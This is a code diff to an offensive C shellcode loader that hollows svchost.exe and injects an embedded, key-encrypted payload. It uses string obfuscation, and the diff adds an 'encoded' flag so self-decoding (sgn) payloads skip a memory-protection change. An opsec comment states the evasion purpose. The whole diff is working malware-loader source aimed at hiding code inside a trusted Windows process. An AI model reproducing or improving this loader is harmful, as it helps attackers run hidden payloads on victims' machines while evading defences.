@@ -226,7 +226,7 @@ ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMAT
  * \param buf : shellcode.
  * \return : TRUE if the PE run succesfully else FALSE.
  */
-BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const ProcessAddressInformation ProcessAddressInformation, unsigned char* buf, SIZE_T szAllocation)
+BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const ProcessAddressInformation ProcessAddressInformation, unsigned char* buf, SIZE_T szAllocation, bool encoded)
 {
 	LPVOID lpAllocAddress;
 	DWORD64 addrBuf;
@@ -260,12 +260,13 @@ BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const ProcessAddressInformation P
 	{
 		return FALSE;
 	}
-	status = _NtProtectVirtualMemory(lpPI->hProcess, &addressOfEntryPoint, &szAllocation, oldProtect, &oldProtect);
-	if (status != STATUS_SUCCESS)
-	{
-		return FALSE;
+	if (!encoded) {
+		status = _NtProtectVirtualMemory(lpPI->hProcess, &addressOfEntryPoint, &szAllocation, oldProtect, &oldProtect);
+		if (status != STATUS_SUCCESS)
+		{
+			return FALSE;
+		}
 	}
-
 	_NtResumeThread(lpPI->hThread, NULL);
 
 	return TRUE;
@@ -274,9 +275,9 @@ BOOL RunPE64(const LPPROCESS_INFORMATION lpPI, const ProcessAddressInformation P
 
 int main(const int argc, char* argv[])
 {
-
 	const LPSTR lpTargetProcess = (LPSTR)AY_OBFUSCATE("C:\\Windows\\System32\\svchost.exe");
 	string key_s = (string)AY_OBFUSCATE("Password");
+	bool encoded = false; // If payload is encoded (e.g. sgn) or not sure -> true (less opsec?)
 	unsigned char buf[] =
 		"\xd4\xec\x0a\x8f\x6c\x95\xb5\x70\x16\x34\x59\xdd\x8a\xc9"
 		"\x47\xf7\x29\x12\x9e\x90\xd7\x82\x2d\x2f\x9c\x06\x01\x82"
@@ -347,7 +348,7 @@ int main(const int argc, char* argv[])
 	printf(AY_OBFUSCATE("[+] Target Process PEB : 0x%p\n"), ProcessAddressInformation.lpProcessPEBAddress);
 	printf(AY_OBFUSCATE("[+] Target Process Image Base : 0x%p\n"), ProcessAddressInformation.lpProcessImageBaseAddress);
 
-	if (RunPE64(&PI, ProcessAddressInformation, shellcode, szAllocation))
+	if (RunPE64(&PI, ProcessAddressInformation, shellcode, szAllocation, encoded))
 	{
 		printf(AY_OBFUSCATE("[+] The injection has succeed !\n"));
 		return 0;
